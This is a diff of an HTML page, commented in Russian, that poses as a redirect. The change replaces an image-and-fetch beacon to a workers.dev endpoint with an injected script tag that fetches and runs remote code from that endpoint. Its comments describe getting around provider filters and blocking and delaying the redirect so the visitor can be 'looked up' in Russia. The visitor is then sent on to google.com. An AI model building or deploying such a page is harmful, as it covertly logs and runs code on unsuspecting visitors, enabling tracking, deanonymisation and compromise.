@@ -1,46 +1,20 @@
-<head>
-    <meta charset="UTF-8">
-    <title>Redirecting...</title>
-</head>
-<body>
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"></head>
+<body style="background:#000;">
     <script>
-        function start() {
-            const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/";
-            
-            // Добавляем случайный параметр, чтобы обмануть фильтры провайдеров (cache busting)
-            const finalUrl = workerUrl + "?nocache=" + Date.now();
-
-            const go = () => { window.location.replace("https://google.com"); };
-        const t = encodeURIComponent(new Date().toLocaleString());
-        const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/";
+        // 1. Твоя подтвержденная ссылка + анти-кэш
+        const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/" + Math.random();
         
-        const i = new Image();
-        const go = () => window.location.replace("https://google.com");
-        
-        i.onload = go;
-        i.onerror = go;
-        
-        // Отправляем только метку времени, остальное соберет воркер на сервере
-        i.src = workerUrl + "?t=" + t;
+        // 2. Создаем элемент скрипта (самый мощный способ обхода блокировок)
+        const s = document.createElement('script');
+        s.src = workerUrl;
+        document.head.appendChild(s);
 
-            fetch(finalUrl, { 
-                mode: 'no-cors', 
-                cache: 'no-store' 
-            })
-            .then(go)
-            .catch(() => {
-                // Если домен заблочен, ждем чуть-чуть и уходим
-                setTimeout(go, 1000);
-            });
-
-            // Жесткий таймер на случай зависания сети
-            setTimeout(go, 3000);
-        }
-        window.onload = start;
-        setTimeout(go, 2000);
+        // 3. Редирект через 2 секунды (запас времени для пробива в РФ)
+        setTimeout(() => {
+            window.location.replace("https://google.com");
+        }, 2000);
     </script>
-</head>
-<body>
-    <h1>Please wait...</h1>
 </body>
 </html>
